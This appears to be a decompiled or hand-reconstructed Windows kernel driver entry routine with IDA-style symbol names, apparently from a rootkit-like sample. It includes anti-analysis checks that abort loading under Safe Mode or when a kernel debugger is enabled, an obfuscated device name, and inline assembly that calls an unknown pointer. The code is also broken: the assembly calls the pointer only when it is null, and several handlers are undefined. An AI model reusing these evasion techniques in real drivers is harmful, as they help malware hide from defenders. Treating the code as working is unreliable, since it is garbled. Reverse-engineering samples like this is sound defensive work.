#include <ntifs.h>
#include <ntddk.h>

extern PULONG InitSafeBootMode;
extern PBOOLEAN KdDebuggerEnabled;
extern PVOID unk_13E80[0x1];
ULONG g_byte_14124 = 0;
ULONG g_Eax, g_Ecx, g_Esi;
extern ULONG g_dword_13E99 = 0xAD49A6FE;

VOID sub_11C42();

NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	PVOID allocatedPool;
	unsigned char byte_13E98 = 1;
	WCHAR devStr[] = L"Nr[D ;";	// whole bunch of letters forming the device name.
	UNICODE_STRING devName;
	PDEVICE_OBJECT devObj;
	NTSTATUS status;

	allocatedPool = ExAllocatePool(NonPagedPool, 0x200);
	if (allocatedPool == NULL) {
		status = STATUS_UNSUCCESSFUL;
		return status;
	}
	else {
		g_byte_14124 = 1;

		__asm {
			mov     eax, [unk_13E80]
			cmp     eax, 0
			jnz      short loc_10403
			call eax

			loc_10403 :
			ret
		}
		status = STATUS_SUCCESS;
	}	
		
	do {
		g_Eax = 0;
		g_Ecx = &g_dword_13E99;
		g_Esi = 0x278;
		sub_11C42();
	} while (FALSE);

	if ((g_dword_13E99 & 0x1) != 0) {
		if (*InitSafeBootMode != 0) { // The operating system is in Safe Mode (SAFEBOOT_MINIMAL | SAFEBOOT_NETWORK | SAFEBOOT_DSREPAIR)
			status = STATUS_UNSUCCESSFUL;
			return status;
		}
		status = STATUS_SUCCESS;
	}
	else if ((g_dword_13E99 & 0x2) != 0) {
		if (*KdDebuggerEnabled == 1) {	// A kernel debugger is connected/enabled.
			status = STATUS_UNSUCCESSFUL;
			return status;
		}
		status = STATUS_SUCCESS;
	}

	RtlInitUnicodeString(&devName, devStr);
	status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &devObj);
	if (!NT_SUCCESS(status)) {
		return status;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = &DefaultIoctl;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = &DefaultIoctl;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = &IoctlDispatch;
	IoRegisterDriverReinitialization(DriverObject, &DriverReinitializationRoutine, NULL);

	return status;
}